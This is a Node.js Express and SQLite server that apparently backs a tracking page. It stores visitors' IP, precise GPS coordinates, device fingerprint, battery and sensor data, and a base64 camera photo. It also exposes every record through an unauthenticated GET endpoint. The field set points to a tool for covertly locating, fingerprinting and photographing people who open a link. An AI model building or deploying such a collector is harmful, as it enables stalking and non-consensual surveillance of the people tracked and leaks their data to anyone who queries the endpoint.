const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' })); // Allow large payloads for base64 photos

// Initialize SQLite database
const db = new sqlite3.Database('./tracking.db', (err) => {
    if (err) {
        console.error('Database error:', err);
    } else {
        console.log('Connected to SQLite database');
        db.run(`
            CREATE TABLE IF NOT EXISTS tracking (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                ip TEXT,
                location TEXT,
                latitude REAL,
                longitude REAL,
                isp TEXT,
                timezone TEXT,
                userAgent TEXT,
                language TEXT,
                screen TEXT,
                batteryLevel REAL,
                batteryCharging BOOLEAN,
                platform TEXT,
                cores INTEGER,
                touch BOOLEAN,
                fingerprint TEXT,
                geoLatitude REAL,
                geoLongitude REAL,
                geoAccuracy REAL,
                photo TEXT,
                orientation TEXT,
                motion TEXT,
                connection TEXT,
                memory REAL,
                gpu TEXT
            )
        `);
    }
});

// POST endpoint to receive tracking data
app.post('/api/track', (req, res) => {
    const data = req.body;
    const stmt = db.prepare(`
        INSERT INTO tracking (
            timestamp, ip, location, latitude, longitude, isp, timezone, userAgent, language, screen,
            batteryLevel, batteryCharging, platform, cores, touch, fingerprint, geoLatitude, geoLongitude,
            geoAccuracy, photo, orientation, motion, connection, memory, gpu
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    stmt.run(
        data.timestamp,
        data.ip,
        data.location,
        data.latitude,
        data.longitude,
        data.isp,
        data.timezone,
        data.userAgent,
        data.language,
        data.screen,
        data.batteryLevel,
        data.batteryCharging,
        data.platform,
        data.cores,
        data.touch,
        data.fingerprint,
        data.geoLatitude,
        data.geoLongitude,
        data.geoAccuracy,
        data.photo,
        JSON.stringify(data.orientation),
        JSON.stringify(data.motion),
        JSON.stringify(data.connection),
        data.memory,
        JSON.stringify(data.gpu),
        (err) => {
            if (err) {
                console.error('Insert error:', err);
                res.status(500).send('Error saving data');
            } else {
                res.status(200).send('Data saved');
            }
        }
    );
    stmt.finalize();
});

// GET endpoint to retrieve all tracking data
app.get('/api/track', (req, res) => {
    db.all('SELECT * FROM tracking', [], (err, rows) => {
        if (err) {
            console.error('Query error:', err);
            res.status(500).send('Error retrieving data');
        } else {
            res.json(rows);
        }
    });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});